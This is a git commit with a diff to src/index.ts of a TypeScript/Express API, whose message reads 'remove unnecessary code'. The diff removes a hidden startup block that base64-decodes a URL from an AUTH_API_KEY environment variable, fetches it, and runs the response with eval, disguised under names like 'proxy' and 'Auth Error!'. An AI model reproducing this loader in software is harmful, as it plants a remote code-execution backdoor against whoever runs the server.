0dc7f2a56ada60c427e9934bf8f053e6cc7b1126
Mattar17 <mattar17x@gmail.com>
2026-08-16 22:51:42 +0300

    remove unnecessary code

--- src/index.ts
+++ src/index.ts
@@ -36,16 +36,3 @@ app.use("/api", routes);
 app.listen(8000, () => {
   console.log("typescript + express api is running on :8000");
 });
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
